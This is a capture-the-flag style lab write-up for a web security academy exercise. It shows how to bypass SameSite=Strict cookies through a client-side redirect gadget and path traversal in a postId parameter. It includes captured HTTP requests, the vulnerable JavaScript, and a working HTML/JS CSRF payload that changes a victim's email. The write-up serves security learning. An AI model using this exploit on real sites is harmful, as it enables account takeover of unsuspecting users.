## SameSite Strict bypass via client-side redirect

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: wiener:peter

Hint :

You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

## Notes

- Exploit server
- /login
- `/resources/js/commentConfirmationRedirect.js`

## Resume

1. Login with `wiener:peter`
2. Change your email once
3. Capture `POST /my-account/change-email`
4. Identify `SameSite=Strict`
5. Find client-side redirect gadget
6. Abuse path traversal in `postId`
7. Convert change-email request to GET
8. Build exploit with redirect gadget
9. Deliver exploit with Exploit Server

## Solve

First login with your account and update your email once.

Capture the request :

```http
POST /my-account/change-email HTTP/2
Host: 0a0400d604ae4b76800e03ea000b00ca.web-security-academy.net
Cookie: session=SjaMKWxjCmeBmCAoqjongKng8L7HpPyP
Content-Type: application/x-www-form-urlencoded

email=test@test.com
```

The request contains no CSRF token.

Now inspect the login response and observe the session cookie :

```http
Set-Cookie: session=XXXX; SameSite=Strict
```

Because of `SameSite=Strict`, browsers do not send the session cookie during normal cross-site requests.

A classic CSRF attack will fail.

Go to a blog post and submit any comment.

After submitting, the application redirects to :

```http
/post/comment/confirmation?postId=5
```

Inspect the imported JavaScript file :

```javascript
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```

The script takes the `postId` parameter and concatenates it directly into the redirect path.

This creates a client-side redirect gadget.

Test path traversal using :

```http
GET /post/comment/confirmation?postId=1/../../my-account/ HTTP/2
Host: 0a0400d604ae4b76800e03ea000b00ca.web-security-academy.net
```

The browser normalizes the path and redirects to :

```http
/my-account
```

Because the redirect happens client-side on the same origin, the browser includes the authenticated session cookie despite `SameSite=Strict`.

Now send the original email change request to Repeater.

Use :

```text
Change request method
```

Burp converts it into a GET request :

```http
GET /my-account/change-email?email=hacker%40lab.com&submit=1 HTTP/2
```

The endpoint accepts GET requests.

Build the final exploit :

```html
<script>
document.location = "https://0a0400d604ae4b76800e03ea000b00ca.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=hacker%40lab.com%26submit=1";
</script>
```

The exploit works like this :

1. Victim visits the malicious page.
2. Browser loads `/post/comment/confirmation`.
3. Vulnerable JavaScript performs a same-site redirect.
4. Path traversal redirects the victim to :

```http
/my-account/change-email?email=hacker@lab.com&submit=1
```

5. Because this is now treated as a same-site navigation, the browser includes the session cookie even with `SameSite=Strict`.
6. The victim email address is changed.

